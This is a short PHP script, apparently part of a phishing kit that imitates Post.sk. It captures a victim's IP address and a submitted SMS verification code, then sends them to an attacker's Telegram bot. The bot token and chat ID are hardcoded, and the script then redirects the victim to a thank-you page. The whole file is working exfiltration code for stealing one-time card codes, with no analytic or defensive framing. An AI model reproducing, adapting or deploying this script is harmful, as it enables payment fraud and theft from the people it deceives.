<?php
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$message  = " ---[ Post.sk_SMS ]--- \n";
$message .= " + IP   : $ip \n";
$message .= " + SMS : ".$_POST['ccSMS']." \n\n";
$message .= "-------------- IP Infos ------------\n";
$api = "2088425131:AAFm3EhG_BLrskQgFoXk1Z9Blyj0uG56wTc";
$chatid = "-1001555448114";
file_get_contents("https://api.telegram.org/bot".$api."/sendMessage?chat_id=".$chatid."&text=" . urlencode($message)."" );


header("Location: ../Thankyou");?>